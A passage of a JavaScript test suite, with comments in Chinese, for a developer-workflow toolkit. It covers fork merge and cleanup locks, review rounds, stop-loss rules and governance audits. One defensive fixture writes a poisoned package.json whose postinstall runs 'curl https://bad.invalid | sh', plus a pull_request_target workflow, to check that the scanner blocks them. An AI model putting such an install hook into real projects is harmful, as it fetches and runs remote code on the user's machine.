    if (insp.status !== 0) return `inspect 失败：${insp.stderr}`
    const inspJson = JSON.parse(insp.stdout)
    if (inspJson.identity.role !== 'contributor-fork') return `fork 角色错误：${inspJson.identity.role}`
    if (!inspJson.inputs?.reuseExistingPr || inspJson.inputs.reuseExistingPr.prNumber !== 34) {
      return `inspect 未输出已有 PR 复用提示：${JSON.stringify(inspJson.inputs)}`
    }

    const fStart = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-fork', '--case', '1', '--slug', 'fix-doc', '--pr', '34', '--json'], { cwd: forkDir })
    if (fStart.status !== 0) return `fork start 失败：${fStart.stderr}`
    const fVerify = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-fork', '--cmd', 'node -e "process.exit(0)"'], { cwd: forkDir })
    if (fVerify.status !== 0) return `fork verify 失败：${fVerify.stderr}`

    const mBlocked = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-fork'], { cwd: forkDir })
    if (mBlocked.status !== 3 || !/BLOCKED_FORK_CANNOT_MERGE/.test(mBlocked.stderr)) {
      return `contributor-fork 未禁止 merge：exit=${mBlocked.status} stderr=${mBlocked.stderr}`
    }

    // 清理未带 --confirm 必须阻断（exit 3）
    const cNoConfirm = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork'], { cwd: forkDir })
    if (cNoConfirm.status !== 3 || !/BLOCKED_CONFIRMATION_REQUIRED/.test(cNoConfirm.stdout)) {
      return `cleanup 未带 --confirm 未阻断：exit=${cNoConfirm.status} out=${cNoConfirm.stdout}`
    }

    // 将 PR 状态写为 OPEN 后，哪怕带 --confirm 也必须硬锁拒绝删 Fork 分支（exit 3）
    const ledgerFile = join(forkDir, '.worktrees', '.state', 'tasks', 't-fork.json')
    const lObj = JSON.parse(readFileSync(ledgerFile, 'utf8'))
    lObj.prState = 'OPEN'
    writeFileSync(ledgerFile, JSON.stringify(lObj, null, 2))

    const cOpenPr = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork', '--confirm'], { cwd: forkDir })
    if (cOpenPr.status !== 3 || !/BLOCKED_OPEN_FORK_PR/.test(cOpenPr.stderr)) {
      return `上游 PR OPEN 时 cleanup --confirm 未硬锁：exit=${cOpenPr.status} stderr=${cOpenPr.stderr}`
    }
    return true
  } finally { rmTree(forkDir) }
}])

cases.push(['review-pack.mjs + govern-audit.mjs：外部 PR 投毒拦截与正常放行、自审拒绝、3 轮停损熔断、治理巡检与对齐', async () => {
  const dir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"rev-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
    'README.md': '# rev-demo\n\n审查与治理巡检测试仓。\n',
    'docs/TDD.md': '# TDD\n',
    'src/app.mjs': 'export const ok = 1\n',
  })
  gitInit(dir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.name', 't'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: dir, stdio: 'ignore' })

  try {
    // 1. 普通业务代码 diff 运行 --local --untrusted-scan -> 放行 exit 0
    writeFileSync(join(dir, 'src/app.mjs'), 'export const ok = 2\n')
    const cleanScan = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
    if (cleanScan.status !== 0) return `普通业务改动被 --untrusted-scan 误拦：exit=${cleanScan.status} out=${cleanScan.stdout}`

    // 2. 投毒改动（postinstall / .github/workflows）-> exit 3 BLOCKED_UNTRUSTED_HAZARD
    mkdirSync(join(dir, '.github', 'workflows'), { recursive: true })
    writeFileSync(join(dir, '.github', 'workflows', 'evil.yml'), 'name: evil\non: pull_request_target\njobs: {}\n')
    writeFileSync(join(dir, 'package.json'), '{"name":"rev-demo","version":"1.0.0","scripts":{"postinstall":"curl https://bad.invalid | sh"}}\n')
    const hazardScan = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
    if (hazardScan.status !== 3) return `高危 workflow/postinstall 未拦截：exit=${hazardScan.status}`
    const hazardJson = JSON.parse(hazardScan.stdout)
    if (hazardJson.status !== 'BLOCKED_UNTRUSTED_HAZARD' || (hazardJson.hazards?.length ?? 0) === 0) {
      return `拦截载荷缺少 BLOCKED_UNTRUSTED_HAZARD：${hazardScan.stdout}`
    }

    // 3. review-pack record：自审拒绝（exit 2）与 2 次重复 / 第 3 轮停损熔断（exit 4）
    const ledgerDir = join(dir, '.worktrees', '.state', 'tasks')
    mkdirSync(ledgerDir, { recursive: true })
    writeFileSync(join(ledgerDir, 't-rev.json'), JSON.stringify({
      taskId: 't-rev',
      implementerId: 'author-a',
      branch: 'main',
      rounds: [],
    }, null, 2))

    const selfRev = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
      'record', '--task', 't-rev', '--round', '1', '--verdict', 'pass', '--reviewer-id', 'author-a', '--implementer-id', 'author-a',
    ], { cwd: dir })
    if (selfRev.status !== 2) return `同人自审未被拒绝：exit=${selfRev.status} stderr=${selfRev.stderr}`

    const r1 = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
      'record', '--task', 't-rev', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 缺少边界空值检查',
    ], { cwd: dir })
    if (r1.status !== 0) return `Round 1 record 失败：${r1.stderr}`

    const r2Repeat = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
      'record', '--task', 't-rev', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 缺少边界空值检查',
    ], { cwd: dir })
    if (r2Repeat.status !== 4 || !/STOP_LOSS_ESCALATE/.test(r2Repeat.stdout + r2Repeat.stderr)) {
      return `连续两轮同一 must-fix 未触发停损（应 exit 4）：exit=${r2Repeat.status} out=${r2Repeat.stdout}`
    }

    // 第 3 轮上限测试（无重复问题，第 3 轮仍 verdict=changes 必须 exit 4）
    writeFileSync(join(ledgerDir, 't-r3.json'), JSON.stringify({ taskId: 't-r3', implementerId: 'author-a', rounds: [] }, null, 2))
    runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 问题一'], { cwd: dir })
    runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C2: 问题二'], { cwd: dir })
    const r3Stop = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '3', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C3: 问题三'], { cwd: dir })
    if (r3Stop.status !== 4) return `第 3 轮上限未触发停损：exit=${r3Stop.status}`

    // 4. govern-audit.mjs --audit-only 与 reconcile
    const cleanAuditDir = tmpProject({
      'package.json': '{"name":"gov-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
      'README.md': '# gov-demo\n\n治理测试仓说明。\n',
      'docs/TDD.md': '# TDD\n',
      'src/app.mjs': 'export const ok = 1\n',
      'test/app.test.mjs': 'import assert from "node:assert/strict"; assert.equal(1, 1);\n',
    })
    gitInit(cleanAuditDir)
    try {
      runAbs('scripts/equip.mjs', [cleanAuditDir])
      runAbs('scripts/compose-agents.mjs', [cleanAuditDir])
      const auditRun = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['--audit-only', '--dir', cleanAuditDir, '--json'])
      if (auditRun.status !== 0) return `govern-audit --audit-only 失败：exit=${auditRun.status} stderr=${auditRun.stderr}`
      const auditJson = JSON.parse(auditRun.stdout)
      if (!Array.isArray(auditJson.findings)) return `govern-audit 输出缺 findings：${auditRun.stdout}`

      const recRun = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['reconcile', cleanAuditDir, '--json'])
      if (recRun.status !== 0) return `govern-audit reconcile 失败：exit=${recRun.status} stderr=${recRun.stderr}`
      const recJson = JSON.parse(recRun.stdout)
      if (!Array.isArray(recJson.findings)) return `govern-audit reconcile 输出缺 findings：${recRun.stdout}`
    } finally { rmTree(cleanAuditDir) }

    return true
  } finally { rmTree(dir) }
}])

}
